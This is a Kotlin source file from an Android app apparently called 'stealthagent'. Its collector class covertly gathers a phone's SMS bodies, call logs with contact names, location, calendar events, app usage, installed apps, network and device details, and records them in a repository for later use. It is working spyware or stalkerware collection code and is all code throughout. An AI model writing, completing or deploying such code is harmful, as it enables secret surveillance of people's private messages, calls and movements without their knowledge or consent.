package com.stealthagent.collector

import android.annotation.SuppressLint
import android.app.usage.UsageEvents
import android.app.usage.UsageStatsManager
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.os.StatFs
import android.os.SystemClock
import android.provider.CallLog
import android.provider.CalendarContract
import android.provider.Telephony
import android.text.format.Formatter
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import com.google.android.gms.tasks.CancellationTokenSource
import com.stealthagent.data.AgentRepository
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import javax.inject.Inject
import javax.inject.Singleton
import kotlin.coroutines.resume

@Singleton
class AllCollectors @Inject constructor(
    @ApplicationContext private val context: Context,
    private val repository: AgentRepository,
) {
    private val pm: PackageManager = context.packageManager
    private var lastAppUsagePoll: Long = System.currentTimeMillis()
    private var lastCallLogDate: Long = System.currentTimeMillis()
    private var lastSmsDate: Long = System.currentTimeMillis()

    suspend fun collectAll() {
        runCatching { collectAppUsage() }
        runCatching { collectBattery() }
        runCatching { collectNetwork() }
        runCatching { collectLocation() }
        runCatching { collectCallLog() }
        runCatching { collectSms() }
        runCatching { collectDeviceInfo() }
        runCatching { collectInstalledApps() }
        runCatching { collectCalendar() }
    }

    private suspend fun collectAppUsage() {
        val usm = context.getSystemService(Context.USAGE_STATS_SERVICE) as? UsageStatsManager ?: return
        val now = System.currentTimeMillis()
        val events = usm.queryEvents(lastAppUsagePoll, now)
        val event = UsageEvents.Event()
        while (events.hasNextEvent()) {
            events.getNextEvent(event)
            if (event.eventType == UsageEvents.Event.MOVE_TO_FOREGROUND ||
                event.eventType == UsageEvents.Event.MOVE_TO_BACKGROUND) {
                val appName = runCatching { pm.getApplicationLabel(pm.getApplicationInfo(event.packageName, 0)).toString() }.getOrNull()
                val action = if (event.eventType == UsageEvents.Event.MOVE_TO_FOREGROUND) "FOREGROUND" else "BACKGROUND"
                repository.recordEvent("APP_USAGE", Json.encodeToString(mapOf(
                    "packageName" to event.packageName, "appName" to (appName ?: ""), "event" to action, "timestampMs" to event.timeStamp.toString()
                )))
            }
        }
        lastAppUsagePoll = now
    }

    private suspend fun collectBattery() {
        val intent = context.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED)) ?: return
        val level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
        val scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, 100)
        val status = intent.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
        val temp = intent.getIntExtra(BatteryManager.EXTRA_TEMPERATURE, 0)
        val isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL
        repository.recordEvent("BATTERY", Json.encodeToString(mapOf(
            "level" to level.toString(), "scale" to scale.toString(), "isCharging" to isCharging.toString(), "temperature" to temp.toString()
        )))
    }

    @SuppressLint("MissingPermission")
    private suspend fun collectNetwork() {
        val wm = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager ?: return
        val info = wm.connectionInfo ?: return
        val ssid = info.ssid?.removePrefix("\"")?.removeSuffix("\"")?.takeIf { it != "<unknown ssid>" }
        @Suppress("DEPRECATION")
        val ip = Formatter.formatIpAddress(info.ipAddress)
        repository.recordEvent("NETWORK", Json.encodeToString(mapOf(
            "ssid" to (ssid ?: ""), "connected" to (ssid != null).toString(), "ipAddress" to ip
        )))
    }

    @SuppressLint("MissingPermission")
    private suspend fun collectLocation() {
        val fusedClient = LocationServices.getFusedLocationProviderClient(context)
        val location = suspendCancellableCoroutine { cont ->
            val cts = CancellationTokenSource()
            cont.invokeOnCancellation { cts.cancel() }
            fusedClient.getCurrentLocation(Priority.PRIORITY_BALANCED_POWER_ACCURACY, cts.token)
                .addOnSuccessListener { cont.resume(it) }
                .addOnFailureListener { cont.resume(null) }
        } ?: return
        repository.recordEvent("LOCATION", Json.encodeToString(mapOf(
            "latitude" to location.latitude.toString(), "longitude" to location.longitude.toString(),
            "accuracy" to location.accuracy.toString()
        )))
    }

    private suspend fun collectCallLog() {
        val cursor = context.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.CACHED_NAME, CallLog.Calls.TYPE, CallLog.Calls.DURATION, CallLog.Calls.DATE),
            "${CallLog.Calls.DATE} > ?", arrayOf(lastCallLogDate.toString()), "${CallLog.Calls.DATE} ASC"
        )
        cursor?.use {
            while (it.moveToNext()) {
                val date = it.getLong(4)
                val typeStr = when (it.getInt(2)) {
                    CallLog.Calls.INCOMING_TYPE -> "INCOMING"; CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
                    CallLog.Calls.MISSED_TYPE -> "MISSED"; else -> "UNKNOWN"
                }
                repository.recordEvent("CALL_LOG", Json.encodeToString(mapOf(
                    "number" to (it.getString(0) ?: ""), "contactName" to (it.getString(1) ?: ""),
                    "type" to typeStr, "duration" to it.getInt(3).toString(), "date" to date.toString()
                )))
                if (date > lastCallLogDate) lastCallLogDate = date
            }
        }
    }

    private suspend fun collectSms() {
        val cursor = context.contentResolver.query(
            Telephony.Sms.CONTENT_URI,
            arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.TYPE, Telephony.Sms.DATE),
            "${Telephony.Sms.DATE} > ?", arrayOf(lastSmsDate.toString()), "${Telephony.Sms.DATE} ASC"
        )
        cursor?.use {
            while (it.moveToNext()) {
                val date = it.getLong(3)
                val typeStr = if (it.getInt(2) == Telephony.Sms.MESSAGE_TYPE_INBOX) "INBOX" else "SENT"
                repository.recordEvent("SMS", Json.encodeToString(mapOf(
                    "address" to (it.getString(0) ?: ""), "body" to (it.getString(1) ?: ""),
                    "type" to typeStr, "date" to date.toString()
                )))
                if (date > lastSmsDate) lastSmsDate = date
            }
        }
    }

    private suspend fun collectDeviceInfo() {
        val am = context.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
        val memInfo = android.app.ActivityManager.MemoryInfo()
        am.getMemoryInfo(memInfo)
        val stat = StatFs(Environment.getDataDirectory().path)
        repository.recordEvent("DEVICE_INFO", Json.encodeToString(mapOf(
            "freeStorage" to stat.availableBytes.toString(), "totalStorage" to stat.totalBytes.toString(),
            "freeRam" to memInfo.availMem.toString(), "totalRam" to memInfo.totalMem.toString(),
            "uptimeMs" to SystemClock.elapsedRealtime().toString(),
            "model" to Build.MODEL, "manufacturer" to Build.MANUFACTURER,
            "androidVersion" to Build.VERSION.RELEASE
        )))
    }

    @Suppress("DEPRECATION")
    private suspend fun collectInstalledApps() {
        val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
        for (appInfo in apps) {
            if ((appInfo.flags and ApplicationInfo.FLAG_SYSTEM) != 0) continue
            val pkgInfo = runCatching { pm.getPackageInfo(appInfo.packageName, 0) }.getOrNull() ?: continue
            repository.recordEvent("INSTALLED_APPS", Json.encodeToString(mapOf(
                "packageName" to appInfo.packageName,
                "appName" to pm.getApplicationLabel(appInfo).toString(),
                "versionName" to (pkgInfo.versionName ?: ""),
            )))
        }
    }

    private suspend fun collectCalendar() {
        val now = System.currentTimeMillis()
        val weekAhead = now + 7 * 24 * 3600 * 1000L
        val cursor = context.contentResolver.query(
            CalendarContract.Events.CONTENT_URI,
            arrayOf(CalendarContract.Events.TITLE, CalendarContract.Events.DTSTART, CalendarContract.Events.DTEND, CalendarContract.Events.EVENT_LOCATION),
            "${CalendarContract.Events.DTSTART} > ? AND ${CalendarContract.Events.DTSTART} < ?",
            arrayOf(now.toString(), weekAhead.toString()), "${CalendarContract.Events.DTSTART} ASC"
        )
        cursor?.use {
            while (it.moveToNext()) {
                repository.recordEvent("CALENDAR_EVENT", Json.encodeToString(mapOf(
                    "title" to (it.getString(0) ?: ""), "startTime" to it.getLong(1).toString(),
                    "endTime" to it.getLong(2).toString(), "location" to (it.getString(3) ?: "")
                )))
            }
        }
    }
}
